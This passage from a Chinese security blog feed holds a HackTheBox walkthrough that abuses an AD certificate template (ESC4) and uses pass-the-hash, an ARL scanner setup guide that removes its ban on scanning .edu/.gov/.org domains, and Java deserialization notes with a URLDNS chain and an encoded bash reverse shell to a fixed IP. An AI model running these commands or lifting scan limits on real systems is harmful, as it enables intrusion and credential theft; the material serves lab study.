<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload Certify.exe</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221160752219.png" class title="image-20250221160752219">

<p>查看</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Certify.exe find /domain:sequel.htb</span><br></pre></td></tr></table></figure></div>

<p>关键部分，DunderMifflinAuthentication 这个模板能够被 Cert Publishers 组完全控制，且对 Domain Admins 具有注册权利。那么接下来我尝试寻找该模板漏洞，通过 certipy-ad 进行漏洞利用和模板重写来请求高权限证书</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221163706735.png" class title="image-20250221163706735">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vulnerable -stdout</span><br></pre></td></tr></table></figure></div>

<p>通过指定的用户名和哈希值在 Active Directory 中枚举与证书相关的漏洞信息。结果的确显示 DunderMifflinAuthentication 模板危险且具有 ESC4 漏洞</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221165240664.png" class title="image-20250221165240664">

<p>重写该模板信息，使其符合攻击要求</p>
<p>certipy-ad 和 ADCS 通过 自动更新模板权限，使得原本只能由 高权限用户（如 Domain Admins 或 Enterprise Admins） 使用的模板，可以被 低权限用户（如 ca_svc） 申请证书</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad template -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -k -template &#x27;DunderMifflinAuthentication&#x27; -target DC01.sequel.htb -ns 10.10.11.51 -debug</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221170200646.png" class title="image-20250221170200646">

<p>请求一份Administrator用户符合模板要求的证书，此处需要在更新模板后第一时间执行才能得到</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad req -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -template &#x27;DunderMifflinAuthentication&#x27; -upn Administrator@sequel.htb -target DC01.sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -dc-ip 10.10.11.51</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221172824755.png" class title="image-20250221172824755">

<p>借助 pfx 证书通过身份认证</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator_10.pfx</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180641755.png" class title="image-20250221180641755">

<p><strong>PTH，通过 NTLM 哈希实现对目标系统的身份验证</strong></p>
<p>通过上述哈希凭证登录靶机</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180928423.png" class title="image-20250221180928423">

<p>最后在 C:\Users\Administrator\Destop 目录中找到第二个旗帜</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181045514.png" class title="image-20250221181045514">

]]></content>
      <categories>
        <category>靶机系列</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>综合渗透靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>资产侦察系统灯塔ARL优化</title>
    <url>/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h2 id="灯塔介绍与安装"><a href="#灯塔介绍与安装" class="headerlink" title="灯塔介绍与安装"></a>灯塔介绍与安装</h2><p>灯塔一般用于自动化安全扫描，帮助发现和修复安全漏洞，适用于 Web 应用、API、安全配置等多个领域。它通过快速、全面的扫描和详细的报告，帮助开发人员、运维人员等及时了解并解决安全问题。</p>
<p><strong>初始账号密码：</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/arlpass</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111703756.png" class title="image-20241207111703756">

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>选择灯塔魔改版下载，ARL-Puls 是基于灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央<a class="link" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，修改了altDns。</p>
<p>Github地址：<a class="link" href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下载上传或克隆</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ki9mu/ARL-plus-docker</span><br></pre></td></tr></table></figure></div>



<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改域名禁止项</p>
<p>灯塔中指定了无法扫描域名后缀 .edu .gov .org，开启 Docker 之前修改为不存在域名</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102624762.png" class title="image-20241207102624762">

<p>修改后</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102529258.png" class title="image-20241207102529258">

<p>配置 Fofa API</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207103449345.png" class title="image-20241207103449345">



<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>先添加 Docker 数据卷</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume create --name=arl_db</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207105634491.png" class title="image-20241207105634491">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111459771.png" class title="image-20241207111459771">



<h2 id="优化增强"><a href="#优化增强" class="headerlink" title="优化增强"></a>优化增强</h2><h3 id="子域名字典扩容"><a href="#子域名字典扩容" class="headerlink" title="子域名字典扩容"></a>子域名字典扩容</h3><p>灯塔自带的字典仅包含两万个子域名，依赖这个字典进行扫描往往会漏掉一些潜在的子域名</p>
<p>将准备好的子域名字典复制到 arl_worker 中，使⽤如下命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp domain_2w.txt ID:/code/app/dicts/domain_2w.txt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207114224079.png" class title="image-20241207114224079">



<h3 id="指纹增强"><a href="#指纹增强" class="headerlink" title="指纹增强"></a>指纹增强</h3><p>添加指纹，让灯塔拥有更强大的指纹，参考使用 ARL-Finger-ADD</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/loecho-sec/ARL-Finger-ADD</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207120427341.png" class title="image-20241207120427341">

<p>脚本主要实现的功能是通过读取 finger.json 中的数据，向灯塔系统批量添加指纹信息	</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163319548.png" class title="image-20241207163319548">

<p>“keyword”代表关键词识别，通过检索网站 HTML 的 body 或 title 中关键词来识别网站所使用的 CMS；<br>“faviconhash”代表哈希识别，通过对比网站的 favicon 图标哈希值来识别网站使用的 CMS。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163621435.png" class title="image-20241207163621435">

<p>当收集到更多指纹字典时，可以参考 finger.json 的格式来批量导入指纹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ARl-Finger-ADD.py https://192.168.1.1:5003/ admin password</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207170140942.png" class title="image-20241207170140942">



<h3 id="文件泄露检测功能优化"><a href="#文件泄露检测功能优化" class="headerlink" title="文件泄露检测功能优化"></a>文件泄露检测功能优化</h3><p>源代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;fileLeak.py</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173344511.png" class title="image-20241207173344511">

<p>增加扫描的线程数</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173830637.png" class title="image-20241207173830637">

<p>当域名较多时候会出现任务卡死的BUG，增加 try-except 错误处理机制，当检测超时时则返回状态码 404，防⽌服务器响应时间过长导致的长时间堵塞</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207174423021.png" class title="image-20241207174423021">



<h3 id="漏扫轻量化"><a href="#漏扫轻量化" class="headerlink" title="漏扫轻量化"></a>漏扫轻量化</h3><p>Nuclei 的核心逻辑是通过大量的 POC 模板 进行扫描，这种操作可能会对目标系统造成比较大的负面影响。</p>
<p>通过增加轻型扫描工具，让灯塔系统更加完整，这里采用 Vscan 二开版本，选择合适的版本下载并上传至 Linux 服务器</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/youki992/VscanPlus</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214440691.png" class title="image-20241207214440691">

<p>nuclei 相关代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;nuclei_scan.py，逐步修改源码</p>
<p>添加 VscanPlus 的结果保存地址</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214814259.png" class title="image-20241207214814259">

<p>在将 Nuclei 扫描替换为 VscanPlus 扫描时，VscanPlus 的 JSON 结果中包含以下关键字段：</p>
<p>“POC”：对应扫描中使用的漏洞验证命令（POC）。</p>
<p>“file-fuzz”：记录扫描过程中检测到的文件路径或目录地址。</p>
<p>“technologies”：表示扫描过程中识别到的指纹信息（如CMS、服务器类型等）。</p>
<p>其余字段与 Nuclei 输出相同，无需修改。通过调整扫描执行和结果处理逻辑，可以无缝集成 Vscan 扫描。</p>
<p>修改读写逻辑</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207214926165.png" class title="image-20241207214926165">

<p>修改运行命令</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215013596.png" class title="image-20241207215013596">

<p>ARL的 docker 中没有安装 libpcap 包，需要安装并添加软链接</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install libpcap</span><br><span class="line">ln -s /usr/lib64/libpcap.so.1.5.3 /usr/lib64/libpcap.so.0.8</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215606686.png" class title="image-20241207215606686">

<p>测试，运行成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207215633273.png" class title="image-20241207215633273">

<p>最后在 ARL 中测试运行正常</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207221139221.png" class title="image-20241207221139221">



]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化学习记录 - CC1 &amp;&amp; CC6</title>
    <url>/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/</url>
    <content><![CDATA[<h2 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h2><p>URLDNS 是 Java 反序列化漏洞中的一种，利用了 Java 在反序列化过程中可以解析 URL，并且在请求期间利用 DNS 反向解析来泄露信息。</p>
<p>URLDNS 核心是 java.net.URL 类</p>
<p><strong>URLDNS 链示例</strong></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116214614913.png" class title="image-20250116214614913">

<p>首先当进行 URL 组合 hashCode() 代码执行时，底层代码会执行到 URLStreamHander 类的 getHostAddress 方法，达到触发 DNSLOG 请求的效果，如</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        URL url = new URL(&quot;http://92twaa.ceye.io&quot;);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>DNS 网站成功接收到了请求信息</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116213610468.png" class title="image-20250116213610468">

<p>假设不能直接调用 hashCode，这时就需要通过其他多个类组合，最终触发某个类内部的 hashCode，搭配出 URLDNS 链</p>
<p>在 HashMap 类的 readObject 方法中，会执行 hash(key)</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116215234708.png" class title="image-20250116215234708">

<p>继续跟进 hash 方法，内部会执行 hashCode</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116215316992.png" class title="image-20250116215316992">

<p>完整 URLDNS 链</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        URL url = new URL(&quot;http://92twaa.ceye.io&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        setFieldValue(url, &quot;hashCode&quot;, 888);</span><br><span class="line">        //调用了 setFieldValue 方法，通过反射修改了 URL 对象的私有字段 hashCode，将其值设为 888，避免在 hashMap.put 的时候触发DNS解析</span><br><span class="line">        hashMap.put(url, &quot;useless&quot;);</span><br><span class="line">        setFieldValue(url, &quot;hashCode&quot;, -1);</span><br><span class="line">        byte[] poc = serialize(hashMap);</span><br><span class="line">        unserialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        baos.close();</span><br><span class="line">        oos.close();</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unserialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        bais.close();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        System.out.println(field);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Runtime-类"><a href="#Runtime-类" class="headerlink" title="Runtime 类"></a>Runtime 类</h3><p>获取命令执行输出结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream is = Runtime.getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        while ((len = is.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>Linux 无法重定向</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String a = &quot;echo 123 &gt; 1.txt&quot;;</span><br></pre></td></tr></table></figure></div>

<p>如果命令是一个字符串，那么 Java 会后面的 123 &gt; 1.txt 视为一个字符串去 echo，这样代码就不是预期效果</p>
<p><strong>解决方案一</strong></p>
<p>数组传参</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120160632304.png" class title="image-20250120160632304">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmd = new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo 123 &gt; /1.txt&quot;&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>方案二</strong></p>
<p>Base64</p>
<p>&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;60.204.244.254&#x2F;7788 0&gt;&amp;1’</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String cmd = &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzYwLjIwNC4yNDQuMjU0Lzc3ODggMD4mMSc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="ProcessBuilder-类"><a href="#ProcessBuilder-类" class="headerlink" title="ProcessBuilder 类"></a>ProcessBuilder 类</h3><p>用法如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream inputStream = new ProcessBuilder(&quot;whoami&quot;).start().getInputStream();</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        int len = 0;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        while ((len = inputStream.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Runtime 内部也是通过 ProcessBuilder </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120175818890.png" class title="image-20250120175818890">

<h3 id="Processlmpl-类"><a href="#Processlmpl-类" class="headerlink" title="Processlmpl 类"></a>Processlmpl 类</h3><p>用法</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        InputStream inputStream = e.getInputStream();</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        int len = 0;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        while ((len = inputStream.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><p>echo 命令</p>
<p>由于系统环境变量找不到 echo 执行文件，所以使用 cmd 命令进行 echo 的使用</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120154850113.png" class title="image-20250120154850113">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120155000076.png" class title="image-20250120155000076">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream is = Runtime.getRuntime().exec(&quot;cmd /c echo 123&quot;).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        while ((len = is.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120154945960.png" class title="image-20250120154945960">

